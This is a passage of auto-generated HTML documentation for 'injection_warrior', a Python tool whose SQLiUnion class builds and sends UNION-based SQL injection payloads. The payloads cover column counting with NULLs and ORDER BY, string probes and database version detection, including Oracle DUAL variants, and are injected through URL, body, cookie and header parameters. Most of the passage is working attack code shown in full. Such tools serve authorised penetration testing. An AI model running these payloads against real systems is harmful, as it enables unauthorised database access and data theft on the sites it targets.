    elif injection_method == &#34;null&#34; and injection_point == &#34;cookie&#34;:
        payloads = []
        for i in range(1, columns):
            payload = self.__gen_nulls(
                columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=True)
            p = quote + payload
            payloads.append(p)
        cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list,req_json=req_json, resp_json=resp_json,  body_params=body_params)

    elif injection_method == &#34;order_by&#34; and injection_point == &#34;cookie&#34;:
        payloads = self.__gen_order_by(
            columns=columns, comment=comment, delimiter=delimiter, cookie=True, quote=quote, param_value=param_value)
        cookie_param_list = self._params_converted(payloads=payloads, params=cookie_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_param_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

    # END SECTION COOKIE INJECTION

    # START SECTION HEADER INJECTION

    elif injection_method == &#34;null&#34; and injection_point == &#34;header&#34;:
        payloads = []
        for i in range(1, columns):
            payload = self.__gen_nulls(
                columns=i, comment=comment, delimiter=delimiter, oracle=oracle, cookie=False)
            p = param_value+quote + payload
            payloads.append(p)
        header_params_list = self._params_converted(payloads=payloads, params=header_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, req_json=req_json, resp_json=resp_json, header_params=header_params_list, body_params=body_params)

    elif injection_method == &#34;order_by&#34; and injection_point == &#34;header&#34;:
        payloads = self.__gen_order_by(
            columns=columns, comment=comment, delimiter=delimiter, cookie=False, quote=quote, param_value=param_value)
        header_params_list = self._params_converted(payloads=payloads, params=header_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)</code></pre>
</details>
</dd>
<dt id="injection_warrior.sqli_union.SQLiUnion.union_find_string_in_columns"><code class="name flex">
<span>def <span class="ident">union_find_string_in_columns</span></span>(<span>self, url='', string='abcd', http_method='get', html=False, injection_point='url', body_params={}, url_params={}, header_params={}, param_value='test', req_json=False, resp_json=False, cookie_params={}, columns=1, **kwargs)</span>
</code></dt>
<dd>
<div class="desc"><p>method allows to find selected string in generated columns payload for SQL Union based injection</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>url</code></strong> :&ensp;<code>str</code></dt>
<dd>[URL for endpoint]. Defaults to "".</dd>
<dt><strong><code>http_method</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".</dd>
<dt><strong><code>injection_point</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[Place where payloads should be injected]. Defaults to "url".</dd>
<dt><strong><code>string</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[String to search in columns]. Defaults to "abcd".</dd>
<dt><strong><code>columns</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>[Number of columns]. Defaults to 1.</dd>
<dt><strong><code>param_value</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>[Optional string prefixed before payload]. Defaults to "test".</dd>
<dt><strong><code>body_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>req_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if request should be send as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>resp_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>html</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as HTML]. Defaults to False.</dd>
<dt><strong><code>cookie_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>url_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>header_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>resp_body</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response body should be printed on output console]. Defaults to True</dd>
</dl>
<p>kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '&ndash;', comma: ",", oracle: False, nulls: 1, table_name:
"", column_name_1: "", column_name_2: "", sleep: 5]</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>[dict]</code></dt>
<dd>Dictionary as key value pair</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def union_find_string_in_columns(self, url=&#34;&#34;, string=&#34;abcd&#34;, http_method=&#34;get&#34;, html=False, 
                                 injection_point=&#34;url&#34;, body_params={}, url_params={}, 
                                 header_params={}, param_value=&#34;test&#34;, req_json=False, 
                                 resp_json=False, cookie_params={}, columns=1, **kwargs):
    &#34;&#34;&#34;method allows to find selected string in generated columns payload for SQL Union based injection

    Args:
        url (str): [URL for endpoint]. Defaults to &#34;&#34;.
        http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
        injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
        string (str, optional): [String to search in columns]. Defaults to &#34;abcd&#34;.
        columns (int, optional): [Number of columns]. Defaults to 1.
        param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
        body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
        resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
        html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
        cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
        kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

    Returns:
        [dict]: Dictionary as key value pair
    &#34;&#34;&#34;
    self.resp_json = resp_json
    self.req_json = req_json
    self.html = html
    self.url = url
    self.http_method = http_method
    http_method = http_method.lower()
    
    quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
    comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
    delimiter = kwargs.get(&#39;delimiter&#39;) if kwargs.get(&#39;delimiter&#39;) != None else &#34;+&#34;
    comment = kwargs.get(&#39;comment&#39;) if kwargs.get(&#39;comment&#39;) != None else &#34;--&#34;
    oracle = kwargs.get(&#39;oracle&#39;) if kwargs.get(&#39;columns&#39;) != None else False
    urls = [url]
    
    params_list = []
    if self.debug:
        print(colored(
            &#39;&#39;&#39;[+] UNION attack &#39;FIND STRING IN COLUMNS&#39; selected parameters: 
        HTTP METHOD: {}
        URL: {}
        RETURN HTML: {}
        INJECTION POINT: {}
        BODY PARAMS: {}
        COOKIE PARAMS: {}
        URL PARAMS: {}
        HEADER PARAMS: {}
        REQ JSON: {}
        RESP JSON: {}
        KWARGS: {}
        &#39;&#39;&#39;.format(http_method, url, html, injection_point, body_params, cookie_params, url_params, header_params, req_json, resp_json, kwargs), &#34;yellow&#34;))
    string = &#34;{}{}{}&#34;.format(quote, string, quote)
    if injection_point == &#34;url&#34;:
        payloads = []
        temp = &#39;&#39;
        nulls = [&#34;NULL&#34; for x in range(columns)]
        for i in range(0, len(nulls)):
            if nulls[i] == &#34;NULL&#34;:
                nulls[i] = string
                p = &#39;{}&#39;.format(comma).join(nulls)
                if oracle:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                else:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                payloads.append(payload)
            nulls[i] = &#34;NULL&#34;
        url_params_list = self._params_converted(payloads=payloads, params=url_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, url_params=url_params_list, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)
    elif injection_point == &#34;body&#34;:
        payloads = []
        temp = &#39;&#39;
        nulls = [&#34;NULL&#34; for x in range(columns)]
        for i in range(0, len(nulls)):
            if nulls[i] == &#34;NULL&#34;:
                nulls[i] = string
                p = &#39;{}&#39;.format(comma).join(nulls)
                if oracle:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                else:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                temp += payload
            nulls[i] = &#34;NULL&#34;
            payloads.append(temp)
        params_list = self._params_converted(payloads=payloads, params=body_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=params_list, req_json=req_json, resp_json=resp_json)

    elif injection_point == &#34;cookie&#34;:
        payloads = []
        nulls = [&#34;NULL&#34; for x in range(columns)]
        temp = &#39;&#39;
        for i in range(0, len(nulls)):
            if nulls[i] == &#34;NULL&#34;:
                nulls[i] = string
                p = &#39;%2c&#39;.join(nulls)
                if oracle:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                else:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                temp += payload
            nulls[i] = &#34;NULL&#34;
            payloads.append(temp)
        cookie_params_list = self._params_converted(payloads, cookie_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, body_params=body_params, req_json=req_json, resp_json=resp_json)

    elif injection_point == &#34;header&#34;:
        payloads = []
        temp = &#39;&#39;
        nulls = [&#34;NULL&#34; for x in range(columns)]
        for i in range(0, len(nulls)):
            if nulls[i] == &#34;NULL&#34;:
                nulls[i] = string
                p = &#39;{}&#39;.format(quote).join(nulls)
                if oracle:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}FROM{}DUAL{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, delimiter, delimiter, comment, delimiter)
                else:
                    payload = &#34;{}{}{}UNION{}SELECT{}{}{}{}&#34;.format(
                        param_value, quote, delimiter, delimiter, delimiter, p, comment, delimiter)
                temp += payload
            nulls[i] = &#34;NULL&#34;
            payloads.append(temp)
        header_params_list = self._params_converted(payloads, header_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json)</code></pre>
</details>
</dd>
<dt id="injection_warrior.sqli_union.SQLiUnion.union_identify_database_version"><code class="name flex">
<span>def <span class="ident">union_identify_database_version</span></span>(<span>self, url='', http_method='get', dbms='mysql', oracle=False, payloads=[], injection_point='url', body_params={}, req_json=False, resp_json=False, html=None, cookie_params={}, url_params={}, string='test1234', header_params={}, **kwargs)</span>
</code></dt>
<dd>
<div class="desc"><p>method allows to identify database version for SQL Union based injection attack</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>url</code></strong> :&ensp;<code>str</code></dt>
<dd>[URL for endpoint]. Defaults to "".</dd>
<dt><strong><code>http_method</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".</dd>
<dt><strong><code>injection_point</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[Place where payloads should be injected]. Defaults to "url".</dd>
<dt><strong><code>string</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[String to search in columns]. Defaults to "abcd".</dd>
<dt><strong><code>dbms</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[DBMS type for which to generate payloads]. Defaults to "abcd".</dd>
<dt><strong><code>param_value</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>[Optional string prefixed before payload]. Defaults to "test".</dd>
<dt><strong><code>body_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>req_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if request should be send as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>resp_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>html</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as HTML]. Defaults to False.</dd>
<dt><strong><code>cookie_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>url_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>header_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>resp_body</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response body should be printed on output console]. Defaults to True</dd>
</dl>
<p>kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '&ndash;', comma: ",", oracle: False, nulls: 1, table_name:
"", column_name_1: "", column_name_2: "", sleep: 5]</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>[dict]</code></dt>
<dd>Dictionary as key value pair</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def union_identify_database_version(self, url=&#34;&#34;, http_method=&#34;get&#34;, dbms=&#34;mysql&#34;, oracle=False, payloads=[], 
                                    injection_point=&#34;url&#34;,  body_params={}, req_json=False, resp_json=False, html=None, 
                                    cookie_params={}, url_params={}, string=&#39;test1234&#39;, header_params={}, **kwargs):
    
    &#34;&#34;&#34;method allows to identify database version for SQL Union based injection attack

    Args:
        url (str): [URL for endpoint]. Defaults to &#34;&#34;.
        http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
        injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
        string (str, optional): [String to search in columns]. Defaults to &#34;abcd&#34;.
        dbms (str, optional): [DBMS type for which to generate payloads]. Defaults to &#34;abcd&#34;.
        param_value (int, optional): [Optional string prefixed before payload]. Defaults to &#34;test&#34;.
        body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
        resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
        html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
        cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True
        kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

    Returns:
        [dict]: Dictionary as key value pair
    &#34;&#34;&#34;
    if oracle:
        dbms = &#34;oracle&#34;
    if dbms == &#34;&#34;:
        print(colored(&#34;[-] Empty dbms not supported&#34;, &#34;red&#34;))
        sys.exit(0)
    if (dbms == &#34;mysql&#34; and oracle) or (dbms == &#34;postgreSQL&#34; and oracle) or (dbms == &#34;microsoftSQL&#34; and oracle):
        print(colored(
            &#34;[-] Not supported combination for dbms:&#39;{}&#39; and oracle: &#39;{}&#39; &#34;.format(dbms, oracle), &#34;red&#34;))
        sys.exit(0)
        
    quote = kwargs.get(&#39;quote&#39;) if kwargs.get(&#39;quote&#39;) != None else &#34;&#39;&#34;
    comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;
    self.resp_json = resp_json
    self.req_json = req_json
    self.html = html
    self.url = url
    self.http_method = http_method
    http_method = http_method.lower()
    
    urls= [url]
    
    if self.debug:
        print(colored(
            &#39;&#39;&#39;[+] UNION attack &#39;IDENTIFY DATABSE&#39; selected parameters: 
        URL: {}
        HTTP METHOD: {}
        DBMS: {}
        ORACLE: {}
        ORIGINAL PAYLOAD: {}
        INJECTION POINT: {}
        BODY PARAMS: {}
        REQ JSON: {}
        RESP JSON: {}
        RETURN HTML: {}
        COOKIE PARAMS: {}
        URL PARAMS: {}
        BODY PARAMS: {}
        HEADER PARAMS: {}
        STRING TO REPLACE: {}
        PARAM VALUE: {}
        DELIMITER: {}
        KWARGS: {}
        &#39;&#39;&#39;.format(url, http_method, dbms, oracle, payloads, injection_point,  body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params, string, kwargs), &#34;yellow&#34;))

    version = sqli_payloads.get(&#39;version_detection&#39;).get(dbms)
    payloads_list = []
    i = 0
    temp = &#39;&#39;
    p = &#39;&#39;
    if oracle:
        for p in payloads:
            p = p.replace(&#34;,NULL&#34;, &#34;&#34;)
            p = p.replace(&#34;FROM DUAL-- &#34;, &#34;&#34;)
        for v in version:
            i += 1
            temp = p.replace(quote+string+quote, v)
            payloads_list.append(temp)
        print(
            colored(&#34;[+] Datbase version payloads: {}&#34;.format(payloads_list), &#34;yellow&#34;))
    else:
        for p in payloads:
            p = re.sub(&#39;,&#39;, comma, p)
            i += 1
            p = p.replace(quote+string+quote, version)
            payloads_list.append(p)
        print(
            colored(&#34;[+] Datbase version payloads: {}&#34;.format(payloads_list), &#34;yellow&#34;))
    if injection_point == &#34;url&#34;:
        if oracle:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            url_params_list = self._params_converted(payloads=values, params=url_params)
        else:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            url_params_list = self._params_converted(payloads=values, params=url_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params_list, header_params=header_params, body_params=body_params, req_json=req_json, resp_json=resp_json)

    elif injection_point == &#34;body&#34;:
        if oracle:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            body_params_list = self._params_converted(payloads=values, params=body_params)
        else:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            body_params_list = self._params_converted(payloads=values, params=body_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, header_params=header_params, body_params=body_params_list, req_json=req_json, resp_json=resp_json)

    elif injection_point == &#34;header&#34;:
        if oracle:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            header_params_list = self._params_converted(
                payloads=values, params=header_params)
        else:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            header_params_list = self._params_converted(payloads=values, params=header_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list,req_json=req_json, resp_json=resp_json)

    elif injection_point == &#34;cookie&#34;:
        if oracle:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            cookie_params_list = self._params_converted(
                payloads=values, params=cookie_params)
        else:
            values = self._parse_template(payloads=payloads_list, **kwargs)
            cookie_params_list = self._params_converted(
                payloads=values, params=cookie_params)
        return self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point, cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json)</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="injection_warrior.warrior.Injector" href="warrior.html#injection_warrior.warrior.Injector">Injector</a></b></code>:
<ul class="hlist">
<li><code><a title="injection_warrior.warrior.Injector.inject_payload" href="warrior.html#injection_warrior.warrior.Injector.inject_payload">inject_payload</a></code></li>
</ul>
</li>
</ul>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="injection_warrior" href="index.html">injection_warrior</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="injection_warrior.sqli_union.SQLiUnion" href="#injection_warrior.sqli_union.SQLiUnion">SQLiUnion</a></code></h4>
<ul class="">
<li><code><a title="injection_warrior.sqli_union.SQLiUnion.union_find_columns_number" href="#injection_warrior.sqli_union.SQLiUnion.union_find_columns_number">union_find_columns_number</a></code></li>
<li><code><a title="injection_warrior.sqli_union.SQLiUnion.union_find_string_in_columns" href="#injection_warrior.sqli_union.SQLiUnion.union_find_string_in_columns">union_find_string_in_columns</a></code></li>
<li><code><a title="injection_warrior.sqli_union.SQLiUnion.union_identify_database_version" href="#injection_warrior.sqli_union.SQLiUnion.union_identify_database_version">union_identify_database_version</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc"><cite>pdoc</cite> 0.9.1</a>.</p>
</footer>
</body>
</html>